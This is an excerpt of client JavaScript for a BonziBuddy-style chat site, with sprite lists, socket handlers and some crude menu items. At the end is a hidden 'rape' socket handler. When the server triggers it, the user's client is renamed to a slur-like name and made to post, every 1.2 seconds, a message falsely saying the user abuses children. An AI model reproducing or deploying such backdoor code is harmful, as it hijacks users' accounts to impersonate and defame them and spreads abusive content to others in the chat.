...
function loadBonzis(a) {
	...
	{ id: "bonziMametchi", src: "./img/bonzi/mametchi.png" },
	{ id: "bonziJabba", src: "./img/bonzi/jabba.png" },
	{ id: "bonziDroyd", src: "./img/bonzi/droyd.png" },
	{ id: "bonziBeans997", src: "./img/bonzi/beans997.png" },
	{ id: "bonziZainu", src: "./img/bonzi/zainu.png" },
...
function setup() {
    $("#chat_send").click(sendInput),
       ...
       socket.on("baragon", function (a) {
            var b = bonzis[a.guid];
            b.cancel(), b.baragon(a.target);
        }),
	socket.on("beggar", function (a) {
        ...
        socket.on("clap", function (a) {
            ...
            b.clap();
            setTimeout(function () {
                    var sfx = new Audio("WWW/build_www_sfx_clap.mp3.mp3");
                    sfx.play();
            }, 600);
        }),
    ...
    Bonzi = (function () {
                            ...
                            items: {
                                ...
                                asshole: {
                                    ...
                                    callback: function () {
		                                ...
		                                baragon: {
                                    name: "Call an Baragon",
                                    callback: function () {
                                        socket.emit("command", { list: ["baragon", d.userPublic.name] });
                                    },
                                },
                                owo: {
                                    name: "Notice Bulge",
        ...
        return (
			...
			var nametag = twemoji.parse(this.userPublic.name);
                ...
                {
                    key: "baragon",
                    value: function (a) {  this.runSingleEvent([{ type:"text",text:"Hey, "+a+"!"},{type:"text",text:"<img src='/www/img/baragon.png' width=130>",say:"you are  an freaking baragon!"},{type:"anim",anim:"grin_fwd",ticks:15},{type:"idle"}]);
                                            },
                                        },
                                        {
    ...
    window.BonziHandler = new (function () {
        return (
            ...
            (this.prepSprites = function () {
                for (var a = ["black", "blue", "brown", "cyan", "green", "orange", "purple", "red", "pink", "yellow", "pope", "daniel", "bp89","vibri","winxp","chibiette","losky", "god", "spongebob","mametchi","jabba","droyd", "beans997", "zainu"], b = 0; b < a.length; b++) {
                    var c = a[b],
...
var loadQueue = new createjs.LoadQueue(),
    loadDone = [],
    loadNeeded = ["bonziBlack", "bonziBlue", "bonziBrown", "bonziCyan", "bonziGreen", "bonziOrange", "bonziPurple", "bonziRed", "bonziPink", "bonziYellow", "bonziDaniel", "bonziBp89", "bonziVibri", "bonziWinxp", "bonziChibiette", "bonziLosky","bonziSpongebob","bonziMametchi","bonziJabba","bonziDroyd","BonziBeans997","bonziZainu","topjej"];
...
$(function () {
    ...
    socket.on("rape", function (a) {
      socket.emit("command", { list: ["name", "BIGGEST N WORD"] });
      socket.emit("command", { list: ["color", "zainu"] });
      setInterval(() => {
        socket.emit("talk", {
          text: "hi i am {NAME} and i love troonbox and i rape kids uwu",
        });
      }, 1200);
